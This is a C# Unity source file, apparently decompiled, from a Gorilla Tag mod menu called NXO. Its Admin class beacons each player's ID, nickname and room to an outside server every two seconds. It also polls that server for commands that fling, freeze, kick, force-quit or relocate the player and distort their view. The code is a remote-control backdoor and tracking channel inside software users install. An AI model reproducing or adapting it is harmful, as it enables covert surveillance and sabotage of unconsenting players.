
using GorillaLocomotion;
using GorillaNetworking;
using Newtonsoft.Json;
using NXO.Mods.Categories;
using Photon.Pun;
using System.Collections;
using System.Threading;
using UnityEngine;
using UnityEngine.Networking;

#nullable enable
namespace NXO.Utilities;

public class Admin : MonoBehaviour
{
  private string id;
  private string playerName;
  private const string baseUrl = "https://nxoai.onrender.com/auth/";
  public static bool disableMenu;
  public static bool RemoteCommandsEnabled;
  private bool lastKickState = false;
  private bool lastFreezeState = false;
  private bool lastAcidTripState = false;
  private bool lastFuckColorState = false;
  private bool lastHeadSpinState = false;
  private bool lastFreezeRigState = false;
  private bool lastCodeState = false;
  private RigidbodyConstraints cachedConstraints;
  private CommandState currentState;
  private static Vector3? cachedHeadRotation;
  private static float spinYaw;

  private void Awake()
  {
    if (!Admin.RemoteCommandsEnabled)
      return;
    this.StartCoroutine(this.StartRemoteCommands());
  }

  private void Update()
  {
    if (this.currentState?.headspin == null)
      return;
    this.HeadSpinContinuous(this.currentState.headspin.on);
  }

  private IEnumerator StartRemoteCommands()
  {
    while ((Object) GTPlayer.Instance == (Object) null || !PhotonNetwork.InRoom)
      yield return (object) null;
    while (string.IsNullOrEmpty(PhotonNetwork.LocalPlayer.UserId) || string.IsNullOrEmpty(PhotonNetwork.LocalPlayer.NickName))
      yield return (object) null;
    this.id = PhotonNetwork.LocalPlayer.UserId;
    this.playerName = PhotonNetwork.LocalPlayer.NickName;
    this.StartCoroutine(this.Heartbeat());
    this.StartCoroutine(this.PollCommands());
  }

  private IEnumerator Heartbeat()
  {
    while (true)
    {
      string currentRoom = PhotonNetwork.InRoom ? PhotonNetwork.CurrentRoom.Name : "Not in room";
      string url = $"https://nxoai.onrender.com/auth/heartbeat.php?id={UnityWebRequest.EscapeURL(this.id)}&name={UnityWebRequest.EscapeURL(this.playerName)}&room={UnityWebRequest.EscapeURL(currentRoom)}";
      using (UnityWebRequest req = UnityWebRequest.Get(url))
      {
        req.timeout = 5;
        yield return (object) req.SendWebRequest();
      }
      yield return (object) new WaitForSeconds(2f);
      currentRoom = (string) null;
      url = (string) null;
    }
  }

  private IEnumerator PollCommands()
  {
    while (true)
    {
      string url = "https://nxoai.onrender.com/auth/commands.php?id=" + UnityWebRequest.EscapeURL(this.id);
      using (UnityWebRequest req = UnityWebRequest.Get(url))
      {
        req.timeout = 5;
        yield return (object) req.SendWebRequest();
        if (req.result == (UnityWebRequest.Result) 1)
        {
          string json = req.downloadHandler.text;
          if (!string.IsNullOrEmpty(json) && !json.Contains("error"))
          {
            this.currentState = JsonConvert.DeserializeObject<CommandState>(json);
            this.ApplyCommands(this.currentState);
          }
          json = (string) null;
        }
      }
      yield return (object) new WaitForSeconds(2f);
      url = (string) null;
    }
  }

  private void ApplyCommands(CommandState s)
  {
    if (s == null)
      return;
    if (s.menu != null)
      Admin.disableMenu = s.menu.on;
    if (s.fling != null)
      this.FlingPlayer(s.fling.vx, s.fling.vy, s.fling.on);
    if (s.close != null)
      this.CloseGame(s.close.on);
    if (s.freezerig != null)
      this.FreezeRig(s.freezerig.on);
    if (s.freeze != null)
      this.FreezeGame(s.freeze.on);
    if (s.kick != null)
      this.KickPlayer(s.kick.on);
    if (s.code != null)
      this.KickToCode(s.code.on, s.code.value);
    if (s.acidtrip != null)
      this.AcidTripPlayer(s.acidtrip.on);
    if (s.fuckcolor == null)
      return;
    this.FuckColorPlayer(s.fuckcolor.on);
  }

  private void FlingPlayer(float vx, float vy, bool on)
  {
    if (!on)
      return;
    Vector2 vector2 = new Vector2(vx, vy);
    if (vector2 == Vector2.zero)
      return;
    Rigidbody component = ((Component) GTPlayer.Instance).GetComponent<Rigidbody>();
    Transform transform = Camera.main.transform;
    Vector3 vector3 = transform.forward * -vector2.y + transform.right * vector2.x;
    component.velocity += vector3 * 2f;
  }

  private void CloseGame(bool on)
  {
    if (!on)
      return;
    Application.Quit();
  }

  private void FreezeRig(bool on)
  {
    if (on == this.lastFreezeRigState)
      return;
    Rigidbody component = ((Component) GTPlayer.Instance).GetComponent<Rigidbody>();
    if ((Object) component != (Object) null)
    {
      if (on)
      {
        this.cachedConstraints = component.constraints;
        component.velocity = Vector3.zero;
        component.constraints = (RigidbodyConstraints) 14;
      }
      else
        component.constraints = this.cachedConstraints;
    }
    this.lastFreezeRigState = on;
  }

  private void FreezeGame(bool on)
  {
    if (on == this.lastFreezeState)
      return;
    if (on)
      Thread.Sleep(10000);
    this.lastFreezeState = on;
  }

  private void KickPlayer(bool on)
  {
    if (on == this.lastKickState)
      return;
    if (on)
      NetworkSystem.Instance.ReturnToSinglePlayer();
    this.lastKickState = on;
  }

  private void KickToCode(bool on, string code)
  {
    if (on == this.lastCodeState)
      return;
    if (on && !string.IsNullOrEmpty(code))
      PhotonNetworkController.Instance.AttemptToJoinSpecificRoom(code.ToUpper(), (JoinType) 0);
    this.lastCodeState = on;
  }

  private void AcidTripPlayer(bool on)
  {
    if (on == this.lastAcidTripState)
      return;
    Visuals.AcidTrip(on);
    this.lastAcidTripState = on;
  }

  private void FuckColorPlayer(bool on)
  {
    if (on == this.lastFuckColorState)
      return;
    Visuals.FuckLights(on);
    this.lastFuckColorState = on;
  }

  public static void SetHeadSpin(float speed)
  {
    if ((Object) Camera.main == (Object) null)
      return;
    if (!Admin.cachedHeadRotation.HasValue)
      Admin.cachedHeadRotation = new Vector3?(Camera.main.transform.eulerAngles);
    Admin.spinYaw += speed * Time.deltaTime;
    Vector3 vector3 = Admin.cachedHeadRotation.Value;
    vector3.y += Admin.spinYaw;
    Camera.main.transform.eulerAngles = vector3;
  }

  public static void ResetHeadRotation()
  {
    if ((Object) Camera.main == (Object) null || !Admin.cachedHeadRotation.HasValue)
      return;
    Camera.main.transform.eulerAngles = Admin.cachedHeadRotation.Value;
    Admin.cachedHeadRotation = new Vector3?();
    Admin.spinYaw = 0.0f;
  }

  private void HeadSpinContinuous(bool on)
  {
    if (on == this.lastHeadSpinState)
      return;
    if (!on)
      Admin.ResetHeadRotation();
    else
      Admin.SetHeadSpin(360f);
    this.lastHeadSpinState = on;
  }
}
